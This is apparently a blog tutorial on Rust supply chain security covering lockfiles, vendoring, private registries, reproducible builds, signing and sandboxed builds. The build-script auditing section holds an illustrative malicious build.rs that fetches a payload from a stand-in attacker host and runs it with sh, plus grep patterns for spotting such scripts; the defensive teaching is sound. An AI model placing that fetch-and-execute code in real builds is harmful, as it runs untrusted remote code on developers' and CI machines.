---
title: "Lesson 6: Supply Chain Security — Lockfiles, vendoring, and trust"
author: Atharva Pandey
series: "Rust Security in Production"
lesson: 6
keywords: [Rust, rust, security, supply chain, vendoring, lockfile, cargo vendor, crates.io, trust]
tags: [Rust tutorial, rust, security]
date: '2025-05-12T10:08:00.000Z'
---

The xz backdoor was a wake-up call for the entire industry, but honestly, supply chain attacks had been happening for years before that — just more quietly. Typosquatting on npm, malicious PyPI packages, compromised maintainer accounts. The question isn't whether Rust's ecosystem is vulnerable to supply chain attacks. It is. The question is what you're doing about it.

I spent a week last year hardening our build pipeline after we realized that a `cargo build` on our CI server was pulling fresh crate downloads from the internet with no verification beyond what Cargo does by default. If crates.io got compromised, or if our DNS got hijacked, we'd be compiling and shipping attacker code with zero friction.

Let me walk you through how to actually lock this down.

## Understanding the Cargo.lock

The `Cargo.lock` is your first and most important supply chain control. It pins every dependency — direct and transitive — to a specific version and records a checksum.

```toml
# Cargo.lock (excerpt)
[[package]]
name = "serde"
version = "1.0.197"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "3fb1c873e1b9b056a4dc4c0c198b24c3ffa059243875b5b27eaa560b5484c365"
dependencies = [
 "serde_derive",
]
```

That `checksum` field is a SHA-256 hash of the `.crate` file downloaded from crates.io. If someone modifies the crate tarball, the checksum won't match and Cargo will refuse to build.

### Rules for Lockfile Management

**1. Always commit `Cargo.lock` for binaries and services.** This ensures reproducible builds. Every `cargo build` uses exactly the same dependency versions.

```bash
# Make sure Cargo.lock is tracked
git add Cargo.lock
```

**2. For libraries, committing `Cargo.lock` is optional** but I do it anyway for the test suite — I want my CI to test against the same versions every time.

**3. Review `Cargo.lock` diffs in PRs.** When a dependency changes, the lockfile diff shows exactly what changed. Make this part of your code review process.

```bash
# See what changed in the lockfile
git diff Cargo.lock

# More readable: show which crates were added/removed/updated
cargo install cargo-lock
cargo lock diff
```

**4. Use `--locked` in CI builds.** This ensures the build uses exactly what's in the lockfile and fails if anything is out of sync:

```bash
# CI should use --locked to catch lockfile drift
cargo build --locked
cargo test --locked
```

If someone modifies `Cargo.toml` but forgets to update `Cargo.lock`, this catches it.

## Vendoring Dependencies

Vendoring means copying all your dependencies' source code into your repository. It eliminates runtime dependency on crates.io and gives you a complete, auditable snapshot of everything you're building.

### Setting Up Vendoring

```bash
# Vendor all dependencies into a `vendor/` directory
cargo vendor

# This prints config you need to add:
# [source.crates-io]
# replace-with = "vendored-sources"
#
# [source.vendored-sources]
# directory = "vendor"
```

Create a `.cargo/config.toml` to use vendored sources:

```toml
# .cargo/config.toml
[source.crates-io]
replace-with = "vendored-sources"

[source.vendored-sources]
directory = "vendor"
```

Now `cargo build` reads from `vendor/` instead of downloading from the internet.

### When to Vendor

Vendoring adds potentially hundreds of megabytes to your repo. It's not always the right call. Here's my decision matrix:

**Vendor when:**
- You're building in air-gapped environments
- You need to survive crates.io outages
- Your compliance/security team requires a complete source audit
- You want reproducible builds that don't depend on any external service
- You're building firmware or safety-critical software

**Don't vendor when:**
- You're a small team iterating quickly
- Your repo is already large and storage is a concern
- You're comfortable relying on crates.io and the lockfile checksums

### Keeping Vendored Sources Updated

```bash
# After updating Cargo.toml or running cargo update:
cargo vendor

# Review what changed
git diff vendor/

# Commit the updated vendor directory
git add vendor/ Cargo.lock
```

One approach I like: vendor on a scheduled basis (weekly) and review the diffs as a dedicated task, rather than vendoring on every dependency bump.

## Private Registries

If your organization has internal crates, running a private registry gives you control over what your teams can depend on.

### Using a Private Registry

```toml
# .cargo/config.toml

# Your private registry
[registries.my-company]
index = "sparse+https://registry.my-company.com/index/"

# Replace crates.io with a mirror you control
[source.crates-io]
replace-with = "my-company-mirror"

[source.my-company-mirror]
registry = "sparse+https://crates-mirror.my-company.com/index/"
```

```toml
# Cargo.toml — using a private crate
[dependencies]
my-internal-lib = { version = "1.0", registry = "my-company" }
```

### Running Your Own Registry

Several options exist:

- **Cloudsmith** — hosted, supports Cargo natively
- **Artifactory** — if you already have it for other languages
- **kellnr** — open-source, Rust-native registry
- **git index** — Cargo supports using a plain git repo as an index

The simplest approach for small teams is a git-based index:

```bash
# Create a registry index repo
mkdir my-registry && cd my-registry
git init

# Structure:
# my-registry/
#   config.json
#   my/
#     my-crate
```

```json
// config.json
{
    "dl": "https://my-crate-storage.example.com/api/v1/crates",
    "api": "https://my-crate-storage.example.com"
}
```

## Build Verification

Even with vendoring and lockfiles, how do you know the binary you built matches the source you reviewed?

### Reproducible Builds

Rust doesn't produce perfectly reproducible builds out of the box — timestamps, file paths, and randomized compiler internals can cause differences. But you can get close:

```toml
# Cargo.toml
[profile.release]
# Strip debug info for consistency
strip = true
# Use a consistent codegen-units count
codegen-units = 1
# Disable incremental compilation (non-deterministic)
incremental = false
```

```bash
# Set consistent environment for builds
export RUSTFLAGS="--remap-path-prefix=$(pwd)=/build"
export SOURCE_DATE_EPOCH=$(git log -1 --format=%ct)

cargo build --release --locked
```

The `--remap-path-prefix` flag replaces absolute paths in the binary with a canonical prefix, eliminating one source of non-determinism.

### Verifying Build Artifacts

Sign your release binaries so consumers can verify they came from you:

```bash
# Generate a signing key (do this once, protect the key)
# Using minisign — simpler than GPG
cargo install minisign
minisign -G -p myapp.pub -s myapp.key

# Sign a release binary
minisign -S -s myapp.key -m target/release/myapp

# Verify
minisign -V -p myapp.pub -m target/release/myapp
```

Distribute the `.pub` file. Keep the `.key` file in your vault.

## Build Script Auditing

Cargo build scripts (`build.rs`) are often overlooked as a supply chain risk. They run arbitrary code at compile time — they can download files, execute commands, modify your source tree, and exfiltrate data.

```rust
// A malicious build.rs could do any of this:
// - Read environment variables (CI tokens, AWS keys)
// - Download and execute arbitrary code
// - Modify generated source files
// - Phone home with your source code

// Example of a suspicious build.rs pattern:
fn main() {
    // This downloads arbitrary code at build time
    // and runs it. Never trust this pattern.
    let script = reqwest::blocking::get("https://evil.example.com/payload")
        .unwrap()
        .bytes()
        .unwrap();
    std::fs::write("/tmp/payload", &script).unwrap();
    std::process::Command::new("sh")
        .arg("/tmp/payload")
        .status()
        .unwrap();
}
```

### Auditing Build Scripts

```bash
# Find all build scripts in your dependency tree
find vendor/ -name "build.rs" -type f | head -20

# Look for network access in build scripts
grep -r "reqwest\|hyper\|curl\|TcpStream\|UdpSocket" vendor/*/build.rs

# Look for command execution
grep -r "Command::new\|process::Command" vendor/*/build.rs

# Look for file system access outside OUT_DIR
grep -r "std::fs::write\|std::fs::remove\|std::fs::create_dir" vendor/*/build.rs
```

Most build scripts are benign — they detect system libraries, generate bindings, or compile C code. But you should know which ones do what. A build script that makes network requests during compilation is a red flag.

### Sandboxing Builds

For maximum isolation, build in a container with no network access:

```dockerfile
# Dockerfile.build
FROM rust:1.78-slim

# Copy vendored sources — no network needed
COPY . /build
WORKDIR /build

# Build with no network access
# Docker's --network=none flag prevents any network calls
RUN cargo build --release --locked

# Extract the binary
FROM scratch
COPY --from=0 /build/target/release/myapp /myapp
```

```bash
# Build with network disabled
docker build --network=none -f Dockerfile.build -t myapp-build .
```

If a malicious build script tries to phone home, it fails. If it tries to download code, it fails. Your build only succeeds with what's already in the container.

## Monitoring for Supply Chain Threats

Set up automated monitoring beyond just `cargo audit`:

```yaml
# .github/workflows/supply-chain.yml
name: Supply Chain Monitoring

on:
  schedule:
    - cron: '0 */6 * * *'  # Every 6 hours
  push:
    paths:
      - 'Cargo.toml'
      - 'Cargo.lock'

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Check for vulnerabilities
        run: |
          cargo install cargo-audit
          cargo audit

      - name: Check for yanked crates
        run: |
          cargo install cargo-deny
          cargo deny check advisories

      - name: Verify lockfile integrity
        run: cargo build --locked --release 2>&1 || echo "Lockfile out of sync!"

      - name: Check for new maintainers on critical crates
        run: |
          # Custom script to monitor maintainer changes
          # on security-critical dependencies
          for crate in ring rustls serde tokio; do
            curl -s "https://crates.io/api/v1/crates/$crate/owners" | \
              jq '.users[].login' > "/tmp/${crate}_owners.txt"
          done
          # Compare with known-good list
          # Alert if new owners appear on critical crates
```

The maintainer monitoring is something most teams skip, but it's exactly the vector the xz attack used — gaining maintainer trust over time.

## The Trust Model

Let's be honest about what we're trusting:

1. **crates.io** — that it serves the same tarball every time, that accounts aren't compromised
2. **The Rust compiler** — that it correctly compiles code (see Ken Thompson's "Reflections on Trusting Trust")
3. **Each crate author** — that they're not malicious and that their code is correct
4. **Each crate's dependencies** — recursively, all the way down

You can't eliminate trust. But you can:

- **Minimize it** — fewer dependencies means fewer trust decisions
- **Verify it** — checksums, vendoring, build reproducibility
- **Monitor it** — automated auditing, maintainer tracking
- **Contain it** — sandboxed builds, minimal runtime permissions

Perfect supply chain security doesn't exist. But the difference between "we run `cargo build` and hope for the best" and "we vendor, audit, lock, and sandbox" is the difference between hoping and knowing.

Do the work. Lock it down. Sleep better.
